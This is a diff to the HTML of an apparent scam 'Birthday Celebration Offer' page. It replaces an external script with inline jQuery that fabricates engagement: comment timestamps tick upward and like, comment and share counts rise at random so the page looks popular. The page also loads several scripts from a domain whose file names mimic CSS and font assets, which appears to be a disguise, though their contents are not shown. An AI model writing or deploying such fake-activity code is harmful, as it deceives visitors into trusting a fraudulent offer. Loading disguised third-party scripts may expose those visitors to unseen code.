@@ -634,7 +634,38 @@ BIRTHDAY CELEBRATION OFFER
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1733876,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
 </center>
     <script src="https://code.jquery.com/jquery-latest.min.js"></script>
-<script src="https://div-ccss-font-class.ink/script-js-div-id-class-format-color-background-font-style.js"></script>
+ <script>
+         
+        var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+ 
+        
+        </script>
 <script src="https://div-ccss-font-class.ink/script-js-div-id-class-format-color-bg-font-style.js"></script>
 <script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise-css.js"></script>
 <script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise1-css.js"></script>
